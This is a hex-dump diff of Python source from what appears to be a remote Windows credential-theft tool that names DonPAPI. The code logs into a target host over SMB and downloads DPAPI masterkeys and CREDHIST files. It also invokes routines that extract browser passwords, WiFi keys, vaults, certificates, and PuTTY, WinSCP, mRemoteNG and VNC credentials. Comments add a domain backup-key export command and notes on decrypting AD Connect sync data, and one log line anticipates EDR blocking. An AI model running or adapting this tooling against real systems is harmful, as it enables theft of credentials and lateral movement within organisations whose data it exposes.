-00018d30: 7328 290a 0909 0909 0965 7863 6570 7420  s()......except 
-00018d40: 4578 6365 7074 696f 6e20 6173 2065 783a  Exception as ex:
-00018d50: 0a09 0909 0909 0973 656c 662e 6c6f 6767  .......self.logg
-00018d60: 696e 672e 6465 6275 6728 0a09 0909 0909  ing.debug(......
-00018d70: 0909 6622 5b7b 7365 6c66 2e6f 7074 696f  ..f"[{self.optio
-00018d80: 6e73 2e74 6172 6765 745f 6970 7d5d 2045  ns.target_ip}] E
-00018d90: 7863 6570 7469 6f6e 2069 6e20 5265 6d6f  xception in Remo
-00018da0: 7465 4f70 7320 2d20 4d61 7962 6520 626c  teOps - Maybe bl
-00018db0: 6f63 6b65 6420 6279 2045 4452 203f 2022  ocked by EDR ? "
-00018dc0: 290a 0909 0909 0909 7365 6c66 2e6c 6f67  ).......self.log
-00018dd0: 6769 6e67 2e64 6562 7567 2866 2265 7863  ging.debug(f"exc
-00018de0: 6570 7469 6f6e 2077 6173 203a 207b 6578  eption was : {ex
-00018df0: 7d22 290a 0909 0909 2320 7365 6c66 2e0a  }").....# self..
-00018e00: 0909 0909 6966 2073 656c 662e 6f70 7469  ....if self.opti
-00018e10: 6f6e 732e 6e6f 5f64 7061 7069 203d 3d20  ons.no_dpapi == 
-00018e20: 4661 6c73 653a 0a09 0909 0909 7365 6c66  False:......self
-00018e30: 2e67 6574 5f6d 6173 7465 726b 6579 7328  .get_masterkeys(
-00018e40: 290a 0909 0909 0973 656c 662e 4765 745f  )......self.Get_
-00018e50: 4450 4150 495f 5072 6f74 6563 7465 645f  DPAPI_Protected_
-00018e60: 4669 6c65 7328 290a 0909 0909 0973 656c  Files()......sel
-00018e70: 662e 4765 7457 6966 6928 290a 0909 0909  f.GetWifi().....
-00018e80: 0973 656c 662e 4765 7456 6175 6c74 7328  .self.GetVaults(
-00018e90: 290a 0909 0909 0973 656c 662e 4765 7443  )......self.GetC
-00018ea0: 6572 7469 6669 6361 7465 7328 290a 0909  ertificates()...
-00018eb0: 0909 6966 2073 656c 662e 6f70 7469 6f6e  ..if self.option
-00018ec0: 732e 6e6f 5f62 726f 7773 6572 203d 3d20  s.no_browser == 
-00018ed0: 4661 6c73 653a 0a09 0909 0909 7365 6c66  False:......self
-00018ee0: 2e47 6574 4368 726f 6d65 5365 6372 6574  .GetChromeSecret
-00018ef0: 7328 290a 0909 0909 0973 656c 662e 4765  s()......self.Ge
-00018f00: 744d 6f7a 696c 6c61 5365 6372 6574 735f  tMozillaSecrets_
-00018f10: 7772 6170 7065 7228 290a 0909 0909 6966  wrapper().....if
-00018f20: 2073 656c 662e 6f70 7469 6f6e 732e 6e6f   self.options.no
-00018f30: 5f73 7973 6164 6d69 6e73 203d 3d20 4661  _sysadmins == Fa
-00018f40: 6c73 653a 0a09 0909 0909 7365 6c66 2e47  lse:......self.G
-00018f50: 6574 4d52 656d 6f74 654e 4728 290a 0909  etMRemoteNG()...
-00018f60: 0909 0973 656c 662e 4765 7450 7574 7479  ...self.GetPutty
-00018f70: 2829 0a09 0909 0909 7365 6c66 2e47 6574  ()......self.Get
-00018f80: 5769 6e73 6370 2829 0a09 0909 0909 6966  Winscp()......if
-00018f90: 2073 656c 662e 6f70 7469 6f6e 732e 6e6f   self.options.no
-00018fa0: 5f76 6e63 203d 3d20 4661 6c73 653a 0a09  _vnc == False:..
-00018fb0: 0909 0909 0973 656c 662e 4765 7456 4e43  .....self.GetVNC
-00018fc0: 2829 0a09 0909 0969 6620 7365 6c66 2e6f  ().....if self.o
-00018fd0: 7074 696f 6e73 2e6e 6f5f 7265 6365 6e74  ptions.no_recent
-00018fe0: 203d 3d20 4661 6c73 653a 0a09 0909 0909   == False:......
-00018ff0: 7365 6c66 2e47 6574 5265 6365 6e74 4669  self.GetRecentFi
-00019000: 6c65 7328 290a 0a09 0909 0922 2222 0a09  les()......"""..
-00019010: 0909 092a 2a2a 4465 7620 796f 7572 206e  ...***Dev your n
-00019020: 6577 206d 6f64 756c 6520 636f 6465 2061  ew module code a
-00019030: 6e64 2073 7461 7274 2069 7420 6672 6f6d  nd start it from
-00019040: 2068 6572 650a 0a09 0909 0969 6620 7365   here......if se
-00019050: 6c66 2e6f 7074 696f 6e73 2e6e 6f5f 6e65  lf.options.no_ne
-00019060: 775f 6d6f 6475 6c65 203d 3d20 4661 6c73  w_module == Fals
-00019070: 653a 0a09 0909 0909 7365 6c66 2e47 6574  e:......self.Get
-00019080: 4e65 775f 4d6f 6475 6c65 2829 0a09 0909  New_Module()....
-00019090: 0922 2222 0a0a 0909 0909 2320 7365 6c66  ."""......# self
-000190a0: 2e6c 6f67 6769 6e67 2e69 6e66 6f28 6622  .logging.info(f"
-000190b0: 5b7b 7365 6c66 2e6f 7074 696f 6e73 2e74  [{self.options.t
-000190c0: 6172 6765 745f 6970 7d5d 207b 6263 6f6c  arget_ip}] {bcol
-000190d0: 6f72 732e 4f4b 4752 4545 4e7d 2a2d 3d2d  ors.OKGREEN}*-=-
-000190e0: 3d2d 3d2d 3d2d 3d2d 3d2d 3d2d 3d2d 3d2d  =-=-=-=-=-=-=-=-
-000190f0: 3d2d 3d2d 3d2d 3d2d 3d2d 3d2d 3d2d 3d2d  =-=-=-=-=-=-=-=-
-00019100: 3d2d 3d2d 3d2d 3d2d 3d2d 3d2d 3d2a 5c6e  =-=-=-=-=-=-=*\n
-00019110: 7b62 636f 6c6f 7273 2e45 4e44 437d 2229  {bcolors.ENDC}")
-00019120: 0a09 0909 0923 2066 6f72 2075 7365 7220  .....# for user 
-00019130: 696e 2073 656c 662e 7573 6572 733a 0a09  in self.users:..
-00019140: 0909 0923 2075 7365 722e 7265 7375 6d65  ...# user.resume
-00019150: 5f75 7365 725f 696e 666f 2829 0a09 0909  _user_info()....
-00019160: 0923 2075 7365 722e 7265 7375 6d65 5f73  .# user.resume_s
-00019170: 6563 7265 7473 2829 0a09 0909 0923 2065  ecrets().....# e
-00019180: 6c73 653a 0a09 0909 0923 204e 4f54 2041  lse:.....# NOT A
-00019190: 444d 494e 0a09 0909 0973 656c 662e 7175  DMIN.....self.qu
-000191a0: 6974 2829 0a0a 0a09 0965 7863 6570 7420  it().....except 
-000191b0: 4578 6365 7074 696f 6e20 6173 2065 783a  Exception as ex:
-000191c0: 0a09 0909 7365 6c66 2e6c 6f67 6769 6e67  ....self.logging
-000191d0: 2e64 6562 7567 2866 225b 7b73 656c 662e  .debug(f"[{self.
-000191e0: 6f70 7469 6f6e 732e 7461 7267 6574 5f69  options.target_i
-000191f0: 707d 5d20 4e6f 7420 636f 6e6e 6563 7465  p}] Not connecte
-00019200: 6422 290a 0909 0973 656c 662e 6c6f 6767  d")....self.logg
-00019210: 696e 672e 6465 6275 6728 6622 6578 6365  ing.debug(f"exce
-00019220: 7074 696f 6e20 7761 7320 3a20 7b65 787d  ption was : {ex}
-00019230: 2229 0a0a 0964 6566 2067 6574 5f73 6563  ")...def get_sec
-00019240: 7265 7473 2873 656c 6629 3a0a 0909 616c  rets(self):...al
-00019250: 6c5f 7365 6372 6574 7320 3d20 7b7d 0a09  l_secrets = {}..
-00019260: 0966 6f72 2075 7365 7220 696e 2073 656c  .for user in sel
-00019270: 662e 7573 6572 733a 0a09 0909 616c 6c5f  f.users:....all_
-00019280: 7365 6372 6574 735b 7573 6572 5d20 3d20  secrets[user] = 
-00019290: 7573 6572 2e67 6574 5f73 6563 7265 7473  user.get_secrets
-000192a0: 2829 0a0a 2320 4450 4150 4920 756e 7072  ()..# DPAPI unpr
-000192b0: 6f74 6563 740a 2320 4450 4150 4920 6465  otect.# DPAPI de
-000192c0: 6372 7970 744d 6173 7465 726b 6579 0a23  cryptMasterkey.#
-000192d0: 2044 5041 5049 2047 6574 446f 6d61 696e   DPAPI GetDomain
-000192e0: 4261 636b 7570 4d61 7374 6572 4b65 790a  BackupMasterKey.
-000192f0: 2320 6470 6170 692e 7079 2062 6163 6b75  # dpapi.py backu
-00019300: 706b 6579 7320 2d74 2054 4f55 462f 4164  pkeys -t TOUF/Ad
-00019310: 6d69 6e69 7374 7261 7465 7572 3a78 7878  ministrateur:xxx
-00019320: 7878 4031 302e 302e 302e 3130 202d 2d65  xx@10.0.0.10 --e
-00019330: 7870 6f72 740a 2320 746f 2067 6574 2044  xport.# to get D
-00019340: 726f 7062 6f78 2064 6563 7279 7074 6564  ropbox decrypted
-00019350: 2064 6174 6162 6173 6573 3f0a 2320 746f   databases?.# to
-00019360: 2067 6574 2069 436c 6f75 6420 6175 7468   get iCloud auth
-00019370: 656e 7469 6361 7469 6f6e 2074 6f6b 656e  entication token
-00019380: 733f 0a23 2074 6f20 6465 6372 7970 7420  s?.# to decrypt 
-00019390: 4546 5320 6669 6c65 730a 0a23 2041 4443  EFS files..# ADC
-000193a0: 6f6e 6e65 6374 2027 5072 6f67 7261 6d20  onnect 'Program 
-000193b0: 4669 6c65 735c 4d69 6372 6f73 6f66 7420  Files\Microsoft 
-000193c0: 417a 7572 6520 4144 2053 796e 635c 4461  Azure AD Sync\Da
-000193d0: 7461 5c41 4453 796e 632e 6d64 6627 0a23  ta\ADSync.mdf'.#
-000193e0: 2050 726f 6772 616d 2046 696c 6573 5c4d   Program Files\M
-000193f0: 6963 726f 736f 6674 2041 7a75 7265 2041  icrosoft Azure A
-00019400: 4420 5379 6e63 5c44 6174 615c 4144 5379  D Sync\Data\ADSy
-00019410: 6e63 5f6c 6f67 2e6c 6466 0a23 206f 7074  nc_log.ldf.# opt
-00019420: 696d 6973 6174 696f 6e20 3a0a 2320 6c65  imisation :.# le
-00019430: 2075 7365 7220 6573 7420 696c 2064 7520   user est il du 
-00019440: 646f 6d61 696e 206f 7520 6c6f 6361 6c20  domain ou local 
-00019450: 3f0a 2320 6461 6e73 2071 7565 6c20 6361  ?.# dans quel ca
-00019460: 7320 7065 7574 206f 6e20 6465 6368 6966  s peut on dechif
-00019470: 6666 7265 7220 6176 6563 206c 6573 2068  ffrer avec les h
-00019480: 6173 6873 203f 202f 2f20 7369 2063 6f6d  ashs ? // si com
-00019490: 7074 6520 6164 6d69 6e20 6f6e 2073 6520  pte admin on se 
-000194a0: 7365 7274 2064 6573 2068 6173 6820 6c6f  sert des hash lo
-000194b0: 6361 7578 2f73 616d 203f 0a0a 2320 4445  caux/sam ?..# DE
-000194c0: 5620 3a20 205b 6765 745f 6669 6c65 5d20  V :  [get_file] 
-000194d0: 534d 4220 5365 7373 696f 6e45 7272 6f72  SMB SessionError
-000194e0: 3a20 5354 4154 5553 5f53 4841 5249 4e47  : STATUS_SHARING
-000194f0: 5f56 494f 4c41 5449 4f4e 2841 2066 696c  _VIOLATION(A fil
-00019500: 6520 6361 6e6e 6f74 2062 6520 6f70 656e  e cannot be open
-00019510: 6564 2062 6563 6175 7365 2074 6865 2073  ed because the s
-00019520: 6861 7265 2061 6363 6573 7320 666c 6167  hare access flag
-00019530: 7320 6172 6520 696e 636f 6d70 6174 6962  s are incompatib
-00019540: 6c65 2e29 0a                             le.).
+00013800: 707d 5d20 7b62 636f 6c6f 7273 2e57 4152  p}] {bcolors.WAR
+00013810: 4e49 4e47 7d45 7863 6570 7469 6f6e 2067  NING}Exception g
+00013820: 6574 5f6d 6173 7465 726b 6579 737b 6263  et_masterkeys{bc
+00013830: 6f6c 6f72 732e 454e 4443 7d22 290a 0909  olors.ENDC}")...
+00013840: 0909 0973 656c 662e 6c6f 6767 696e 672e  ...self.logging.
+00013850: 6465 6275 6728 6578 290a 0909 0909 0963  debug(ex)......c
+00013860: 6f6e 7469 6e75 650a 0909 2323 4d41 4348  ontinue...##MACH
+00013870: 494e 4520 4d41 5354 4552 4b45 5953 0a09  INE MASTERKEYS..
+00013880: 0974 7279 3a0a 0909 0975 7365 7220 3d20  .try:....user = 
+00013890: 7365 6c66 2e47 6574 5573 6572 4279 4e61  self.GetUserByNa
+000138a0: 6d65 2827 4d41 4348 494e 4524 2729 0a09  me('MACHINE$')..
+000138b0: 0909 2320 4d61 6b65 2061 2022 4d41 4348  ..# Make a "MACH
+000138c0: 494e 4524 2220 7573 6572 0a09 0909 2222  INE$" user....""
+000138d0: 2275 7365 723d 4d79 5573 6572 2822 4d41  "user=MyUser("MA
+000138e0: 4348 494e 4524 222c 7365 6c66 2e6c 6f67  CHINE$",self.log
+000138f0: 6769 6e67 2c73 656c 662e 6f70 7469 6f6e  ging,self.option
+00013900: 7329 0a09 0909 7573 6572 2e74 7970 653d  s)....user.type=
+00013910: 274d 4143 4849 4e45 270a 0909 0973 656c  'MACHINE'....sel
+00013920: 662e 7573 6572 732e 6170 7065 6e64 2875  f.users.append(u
+00013930: 7365 7229 2222 220a 0a09 0909 746d 705f  ser)""".....tmp_
+00013940: 7077 6420 3d20 2757 696e 646f 7773 5c5c  pwd = 'Windows\\
+00013950: 5379 7374 656d 3332 5c5c 4d69 6372 6f73  System32\\Micros
+00013960: 6f66 745c 5c50 726f 7465 6374 2720 2023  oft\\Protect'  #
+00013970: 2041 6464 2057 696e 646f 7773 5c53 6572   Add Windows\Ser
+00013980: 7669 6365 5072 6f66 696c 6573 5c41 4453  viceProfiles\ADS
+00013990: 796e 635c 4170 7044 6174 615c 526f 616d  ync\AppData\Roam
+000139a0: 696e 675c 4d69 6372 6f73 6f66 745c 5072  ing\Microsoft\Pr
+000139b0: 6f74 6563 745c 2066 6f72 2041 4443 6f6e  otect\ for ADCon
+000139c0: 6e65 6374 203f 0a09 0909 7365 6c66 2e6c  nect ?....self.l
+000139d0: 6f67 6769 6e67 2e64 6562 7567 2866 225b  ogging.debug(f"[
+000139e0: 7b73 656c 662e 6f70 7469 6f6e 732e 7461  {self.options.ta
+000139f0: 7267 6574 5f69 707d 5d20 4c6f 6f6b 696e  rget_ip}] Lookin
+00013a00: 6720 666f 7220 4d61 6368 696e 6520 4d61  g for Machine Ma
+00013a10: 7374 6572 6b65 7920 696e 2025 7322 2025  sterkey in %s" %
+00013a20: 2074 6d70 5f70 7764 290a 0909 096d 795f   tmp_pwd)....my_
+00013a30: 6469 7265 6374 6f72 7920 3d20 7365 6c66  directory = self
+00013a40: 2e6d 7966 696c 656f 7073 2e64 6f5f 6c73  .myfileops.do_ls
+00013a50: 2874 6d70 5f70 7764 2c20 2727 2c20 6469  (tmp_pwd, '', di
+00013a60: 7370 6c61 793d 4661 6c73 6529 0a09 0909  splay=False)....
+00013a70: 666f 7220 696e 666f 7320 696e 206d 795f  for infos in my_
+00013a80: 6469 7265 6374 6f72 793a 0a09 0909 096c  directory:.....l
+00013a90: 6f6e 676e 616d 652c 2069 735f 6469 7265  ongname, is_dire
+00013aa0: 6374 6f72 7920 3d20 696e 666f 730a 0909  ctory = infos...
+00013ab0: 0909 6966 206c 6f6e 676e 616d 6520 6e6f  ..if longname no
+00013ac0: 7420 696e 2062 6c61 636b 6c69 7374 3a0a  t in blacklist:.
+00013ad0: 0909 0909 0969 6620 6973 5f64 6972 6563  .....if is_direc
+00013ae0: 746f 7279 2061 6e64 206c 6f6e 676e 616d  tory and longnam
+00013af0: 655b 3a32 5d20 3d3d 2027 532d 273a 2020  e[:2] == 'S-':  
+00013b00: 2320 5349 440a 0909 0909 0909 7365 6c66  # SID.......self
+00013b10: 2e6c 6f67 6769 6e67 2e64 6562 7567 280a  .logging.debug(.
+00013b20: 0909 0909 0909 0966 225b 7b73 656c 662e  .......f"[{self.
+00013b30: 6f70 7469 6f6e 732e 7461 7267 6574 5f69  options.target_i
+00013b40: 707d 5d20 7b62 636f 6c6f 7273 2e4f 4b42  p}] {bcolors.OKB
+00013b50: 4c55 457d 7b75 7365 722e 7573 6572 6e61  LUE}{user.userna
+00013b60: 6d65 7d7b 6263 6f6c 6f72 732e 454e 4443  me}{bcolors.ENDC
+00013b70: 7d20 2d20 466f 756e 6420 5349 4420 7b6c  } - Found SID {l
+00013b80: 6f6e 676e 616d 657d 2229 0a09 0909 0909  ongname}")......
+00013b90: 0975 7365 722e 7369 6420 3d20 6c6f 6e67  .user.sid = long
+00013ba0: 6e61 6d65 0a09 0909 0909 0969 6620 7573  name.......if us
+00013bb0: 6572 2e73 6964 2e73 7461 7274 7377 6974  er.sid.startswit
+00013bc0: 6828 2753 2d31 2d35 2d38 3027 293a 0a09  h('S-1-5-80'):..
+00013bd0: 0909 0909 0909 7365 6c66 2e6c 6f67 6769  ......self.loggi
+00013be0: 6e67 2e64 6562 7567 280a 0909 0909 0909  ng.debug(.......
+00013bf0: 0909 6622 5b7b 7365 6c66 2e6f 7074 696f  ..f"[{self.optio
+00013c00: 6e73 2e74 6172 6765 745f 6970 7d5d 207b  ns.target_ip}] {
+00013c10: 6263 6f6c 6f72 732e 4641 494c 7d7b 7573  bcolors.FAIL}{us
+00013c20: 6572 2e75 7365 726e 616d 657d 7b62 636f  er.username}{bco
+00013c30: 6c6f 7273 2e45 4e44 437d 202d 2046 6f75  lors.ENDC} - Fou
+00013c40: 6e64 2041 4420 434f 4e4e 4543 5420 5349  nd AD CONNECT SI
+00013c50: 4420 7b6c 6f6e 676e 616d 657d 2229 0a09  D {longname}")..
+00013c60: 0909 0909 0909 7573 6572 2e69 735f 6164  ......user.is_ad
+00013c70: 636f 6e6e 6563 7420 3d20 5472 7565 0a09  connect = True..
+00013c80: 0909 0909 0974 6d70 5f70 7764 3220 3d20  .....tmp_pwd2 = 
+00013c90: 6e74 7061 7468 2e6a 6f69 6e28 746d 705f  ntpath.join(tmp_
+00013ca0: 7077 642c 206c 6f6e 676e 616d 6529 0a09  pwd, longname)..
+00013cb0: 0909 0909 096d 795f 6469 7265 6374 6f72  .....my_director
+00013cc0: 7932 203d 2073 656c 662e 6d79 6669 6c65  y2 = self.myfile
+00013cd0: 6f70 732e 646f 5f6c 7328 746d 705f 7077  ops.do_ls(tmp_pw
+00013ce0: 6432 2c20 2727 2c20 6469 7370 6c61 793d  d2, '', display=
+00013cf0: 4661 6c73 6529 0a09 0909 0909 0966 6f72  False).......for
+00013d00: 2069 6e66 6f73 3220 696e 206d 795f 6469   infos2 in my_di
+00013d10: 7265 6374 6f72 7932 3a0a 0909 0909 0909  rectory2:.......
+00013d20: 096c 6f6e 676e 616d 6532 2c20 6973 5f64  .longname2, is_d
+00013d30: 6972 6563 746f 7279 3220 3d20 696e 666f  irectory2 = info
+00013d40: 7332 0a09 0909 0909 0909 6966 206c 6f6e  s2........if lon
+00013d50: 676e 616d 6532 206e 6f74 2069 6e20 626c  gname2 not in bl
+00013d60: 6163 6b6c 6973 743a 0a09 0909 0909 0909  acklist:........
+00013d70: 0969 6620 6e6f 7420 6973 5f64 6972 6563  .if not is_direc
+00013d80: 746f 7279 3220 616e 6420 6973 5f67 7569  tory2 and is_gui
+00013d90: 6428 6c6f 6e67 6e61 6d65 3229 3a20 2023  d(longname2):  #
+00013da0: 2047 5549 440a 0909 0909 0909 0909 0923   GUID..........#
+00013db0: 2044 6f77 6e6c 6f61 6469 6e67 2066 696c   Downloading fil
+00013dc0: 650a 0909 0909 0909 0909 0973 656c 662e  e..........self.
+00013dd0: 646f 776e 6c6f 6164 5f6d 6173 7465 726b  download_masterk
+00013de0: 6579 2875 7365 722c 2074 6d70 5f70 7764  ey(user, tmp_pwd
+00013df0: 322c 206c 6f6e 676e 616d 6532 2c20 7479  2, longname2, ty
+00013e00: 7065 3d27 4d41 4348 494e 4527 290a 0909  pe='MACHINE')...
+00013e10: 0909 0909 0909 656c 6966 2069 735f 6469  ......elif is_di
+00013e20: 7265 6374 6f72 7932 2061 6e64 206c 6f6e  rectory2 and lon
+00013e30: 676e 616d 6532 203d 3d20 2755 7365 7227  gname2 == 'User'
+00013e40: 3a20 2023 204f 6e20 7365 206c 696d 6974  :  # On se limit
+00013e50: 6520 6120 6361 2070 6f75 7220 6c65 206d  e a ca pour le m
+00013e60: 6f6d 656e 740a 0909 0909 0909 0909 0974  oment..........t
+00013e70: 6d70 5f70 7764 3320 3d20 6e74 7061 7468  mp_pwd3 = ntpath
+00013e80: 2e6a 6f69 6e28 746d 705f 7077 6432 2c20  .join(tmp_pwd2, 
+00013e90: 6c6f 6e67 6e61 6d65 3229 0a09 0909 0909  longname2)......
+00013ea0: 0909 0909 6d79 5f64 6972 6563 746f 7279  ....my_directory
+00013eb0: 3320 3d20 7365 6c66 2e6d 7966 696c 656f  3 = self.myfileo
+00013ec0: 7073 2e64 6f5f 6c73 2874 6d70 5f70 7764  ps.do_ls(tmp_pwd
+00013ed0: 332c 2027 272c 2064 6973 706c 6179 3d46  3, '', display=F
+00013ee0: 616c 7365 290a 0909 0909 0909 0909 0966  alse)..........f
+00013ef0: 6f72 2069 6e66 6f73 3320 696e 206d 795f  or infos3 in my_
+00013f00: 6469 7265 6374 6f72 7933 3a0a 0909 0909  directory3:.....
+00013f10: 0909 0909 0909 6c6f 6e67 6e61 6d65 332c  ......longname3,
+00013f20: 2069 735f 6469 7265 6374 6f72 7933 203d   is_directory3 =
+00013f30: 2069 6e66 6f73 330a 0909 0909 0909 0909   infos3.........
+00013f40: 0909 6966 206c 6f6e 676e 616d 6533 206e  ..if longname3 n
+00013f50: 6f74 2069 6e20 626c 6163 6b6c 6973 743a  ot in blacklist:
+00013f60: 0a09 0909 0909 0909 0909 0909 6966 206e  ............if n
+00013f70: 6f74 2069 735f 6469 7265 6374 6f72 7933  ot is_directory3
+00013f80: 2061 6e64 2069 735f 6775 6964 286c 6f6e   and is_guid(lon
+00013f90: 676e 616d 6533 293a 2020 2320 4755 4944  gname3):  # GUID
+00013fa0: 0a09 0909 0909 0909 0909 0909 0973 656c  .............sel
+00013fb0: 662e 6c6f 6767 696e 672e 6465 6275 6728  f.logging.debug(
+00013fc0: 0a09 0909 0909 0909 0909 0909 0909 6622  ..............f"
+00013fd0: 5b7b 7365 6c66 2e6f 7074 696f 6e73 2e74  [{self.options.t
+00013fe0: 6172 6765 745f 6970 7d5d 207b 7573 6572  arget_ip}] {user
+00013ff0: 2e75 7365 726e 616d 657d 202d 2046 6f75  .username} - Fou
+00014000: 6e64 2047 5549 4420 7b6c 6f6e 676e 616d  nd GUID {longnam
+00014010: 6533 7d22 290a 0909 0909 0909 0909 0909  e3}")...........
+00014020: 0909 2320 446f 776e 6c6f 6164 696e 6720  ..# Downloading 
+00014030: 6669 6c65 0a09 0909 0909 0909 0909 0909  file............
+00014040: 0973 656c 662e 646f 776e 6c6f 6164 5f6d  .self.download_m
+00014050: 6173 7465 726b 6579 2875 7365 722c 2074  asterkey(user, t
+00014060: 6d70 5f70 7764 332c 206c 6f6e 676e 616d  mp_pwd3, longnam
+00014070: 6533 2c20 7479 7065 3d27 4d41 4348 494e  e3, type='MACHIN
+00014080: 452d 5553 4552 2729 0a09 0909 0909 0909  E-USER')........
+00014090: 0909 0909 656c 7365 3a0a 0909 0909 0909  ....else:.......
+000140a0: 0909 0909 0909 7365 6c66 2e6c 6f67 6769  ......self.loggi
+000140b0: 6e67 2e64 6562 7567 280a 0909 0909 0909  ng.debug(.......
+000140c0: 0909 0909 0909 0922 466f 756e 6420 756e  ......."Found un
+000140d0: 6578 7065 6374 6564 2066 696c 652f 6469  expected file/di
+000140e0: 7265 6374 6f72 7920 2573 2069 6e20 2573  rectory %s in %s
+000140f0: 2220 2520 2874 6d70 5f70 7764 332c 206c  " % (tmp_pwd3, l
+00014100: 6f6e 676e 616d 6533 2929 0a09 0909 0909  ongname3))......
+00014110: 0909 0965 6c73 653a 0a09 0909 0909 0909  ...else:........
+00014120: 0909 7365 6c66 2e6c 6f67 6769 6e67 2e64  ..self.logging.d
+00014130: 6562 7567 280a 0909 0909 0909 0909 0909  ebug(...........
+00014140: 2246 6f75 6e64 2075 6e65 7870 6563 7465  "Found unexpecte
+00014150: 6420 6669 6c65 2f64 6972 6563 746f 7279  d file/directory
+00014160: 2025 7320 696e 2025 7322 2025 2028 746d   %s in %s" % (tm
+00014170: 705f 7077 6432 2c20 6c6f 6e67 6e61 6d65  p_pwd2, longname
+00014180: 3229 290a 0909 0909 0965 6c69 6620 6973  2))......elif is
+00014190: 5f64 6972 6563 746f 7279 3a0a 0909 0909  _directory:.....
+000141a0: 0909 7365 6c66 2e6c 6f67 6769 6e67 2e64  ..self.logging.d
+000141b0: 6562 7567 2822 466f 756e 6420 286e 6f74  ebug("Found (not
+000141c0: 2053 4944 2920 4469 7265 6374 6f72 7920   SID) Directory 
+000141d0: 2573 2220 2520 6c6f 6e67 6e61 6d65 290a  %s" % longname).
+000141e0: 0909 0909 0965 6c73 653a 0a09 0909 0909  .....else:......
+000141f0: 0973 656c 662e 6c6f 6767 696e 672e 6465  .self.logging.de
+00014200: 6275 6728 2246 6f75 6e64 2066 696c 6520  bug("Found file 
+00014210: 2573 2220 2520 6c6f 6e67 6e61 6d65 290a  %s" % longname).
+00014220: 0909 0909 0909 6966 2022 4352 4544 4849  ......if "CREDHI
+00014230: 5354 2220 696e 206c 6f6e 676e 616d 653a  ST" in longname:
+00014240: 0a09 0909 0909 0909 7365 6c66 2e64 6f77  ........self.dow
+00014250: 6e6c 6f61 645f 6372 6564 6869 7374 2875  nload_credhist(u
+00014260: 7365 722c 2074 6d70 5f70 7764 2c20 6c6f  ser, tmp_pwd, lo
+00014270: 6e67 6e61 6d65 2c20 7479 7065 3d27 4d41  ngname, type='MA
+00014280: 4348 494e 4527 290a 0a09 0965 7863 6570  CHINE')....excep
+00014290: 7420 4578 6365 7074 696f 6e20 6173 2065  t Exception as e
+000142a0: 783a 0a09 0909 7365 6c66 2e6c 6f67 6769  x:....self.loggi
+000142b0: 6e67 2e65 7272 6f72 280a 0909 0909 6622  ng.error(.....f"
+000142c0: 5b7b 7365 6c66 2e6f 7074 696f 6e73 2e74  [{self.options.t
+000142d0: 6172 6765 745f 6970 7d5d 207b 6263 6f6c  arget_ip}] {bcol
+000142e0: 6f72 732e 4641 494c 7d45 7272 6f72 2069  ors.FAIL}Error i
+000142f0: 6e20 4765 744d 6173 7465 726b 6579 2028  n GetMasterkey (
+00014300: 4d61 6368 696e 6529 7b62 636f 6c6f 7273  Machine){bcolors
+00014310: 2e45 4e44 437d 2229 0a09 0909 7365 6c66  .ENDC}")....self
+00014320: 2e6c 6f67 6769 6e67 2e64 6562 7567 2865  .logging.debug(e
+00014330: 7829 0a09 0973 656c 662e 6c6f 6767 696e  x)...self.loggin
+00014340: 672e 6465 6275 6728 0a09 0909 6622 5b7b  g.debug(....f"[{
+00014350: 7365 6c66 2e6f 7074 696f 6e73 2e74 6172  self.options.tar
+00014360: 6765 745f 6970 7d5d 207b 6263 6f6c 6f72  get_ip}] {bcolor
+00014370: 732e 4f4b 424c 5545 7d5b 2d5d 2047 6174  s.OKBLUE}[-] Gat
+00014380: 6865 7265 6420 4d61 7374 6572 6b65 7973  hered Masterkeys
+00014390: 2066 6f72 207b 6c65 6e28 7365 6c66 2e75   for {len(self.u
+000143a0: 7365 7273 297d 2075 7365 7273 7b62 636f  sers)} users{bco
+000143b0: 6c6f 7273 2e45 4e44 437d 2229 0a0a 0964  lors.ENDC}")...d
+000143c0: 6566 2064 6f77 6e6c 6f61 645f 6372 6564  ef download_cred
+000143d0: 6869 7374 2873 656c 662c 2075 7365 722c  hist(self, user,
+000143e0: 2074 6d70 5f70 7764 2c20 6c6f 6e67 6e61   tmp_pwd, longna
+000143f0: 6d65 2c20 7479 7065 3d27 4d41 4348 494e  me, type='MACHIN
+00014400: 4527 293a 0a09 0923 2044 6f77 6e6c 6f61  E'):...# Downloa
+00014410: 6469 6e67 2066 696c 650a 0909 7472 793a  ding file...try:
+00014420: 0a0a 0909 0973 656c 662e 6c6f 6767 696e  .....self.loggin
+00014430: 672e 6465 6275 6728 0a09 0909 0966 225b  g.debug(.....f"[
+00014440: 7b73 656c 662e 6f70 7469 6f6e 732e 7461  {self.options.ta
+00014450: 7267 6574 5f69 707d 5d20 5b2e 2e2e 5d20  rget_ip}] [...] 
+00014460: 446f 776e 6c6f 6164 696e 6720 4352 4544  Downloading CRED
+00014470: 4849 5354 207b 7573 6572 2e75 7365 726e  HIST {user.usern
+00014480: 616d 657d 207b 746d 705f 7077 647d 207b  ame} {tmp_pwd} {
+00014490: 6c6f 6e67 6e61 6d65 7d22 290a 0909 0923  longname}")....#
+000144a0: 2066 726f 6d20 446f 6e50 4150 492e 6c69   from DonPAPI.li
+000144b0: 622e 6470 6170 695f 7069 636b 2e63 7265  b.dpapi_pick.cre
+000144c0: 6468 6973 7420 696d 706f 7274 2043 7265  dhist import Cre
+000144d0: 6448 6973 7446 696c 650a 0909 0923 206c  dHistFile....# l
+000144e0: 6f63 616c 6669 6c65 203d 2073 656c 662e  ocalfile = self.
+000144f0: 6d79 6669 6c65 6f70 732e 6765 745f 6669  myfileops.get_fi
+00014500: 6c65 286e 7470 6174 682e 6a6f 696e 2874  le(ntpath.join(t
+00014510: 6d70 5f70 7764 2c20 6c6f 6e67 6e61 6d65  mp_pwd, longname
+00014520: 2929 0a09 0909 2727 2766 3d6f 7065 6e28  ))....'''f=open(
+00014530: 6c6f 6361 6c66 696c 652c 2772 6227 290a  localfile,'rb').
+00014540: 0909 0963 7265 6468 6973 7464 6174 6120  ...credhistdata 
+00014550: 3d20 662e 7265 6164 2829 0a09 0909 662e  = f.read()....f.
+00014560: 636c 6f73 6528 290a 0909 096d 7943 7265  close()....myCre
+00014570: 6468 6973 7466 696c 6520 3d20 4372 6564  dhistfile = Cred
+00014580: 4869 7374 4669 6c65 2872 6177 3d63 7265  HistFile(raw=cre
+00014590: 6468 6973 7464 6174 6129 0a0a 0909 0970  dhistdata).....p
+000145a0: 7269 6e74 2872 6570 7228 6d79 4372 6564  rint(repr(myCred
+000145b0: 6869 7374 6669 6c65 2929 0a09 0909 236d  histfile))....#m
+000145c0: 7943 7265 6468 6973 7466 696c 6520 3d20  yCredhistfile = 
